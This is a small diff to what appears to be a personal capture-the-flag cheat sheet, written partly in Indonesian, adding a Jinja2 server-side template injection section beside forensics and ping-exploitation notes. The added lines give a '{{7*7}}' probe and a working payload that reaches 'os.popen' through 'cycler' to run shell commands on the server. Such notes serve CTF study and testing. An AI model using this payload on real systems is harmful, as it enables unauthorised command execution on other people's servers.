@@ -17,6 +17,11 @@ icat -o 360448 disk.flag.img 1234
 2. less flag.txt
 3. sed '' flag.txt
 
+# SSTI
+## Via jinja2 
+{{7*7}} (cek ombak)
+{{ cycler.__init__.__globals__.os.popen('ls').read() }} (ls))
+
 # Ping exploitation
 
 | notasi | syntax |
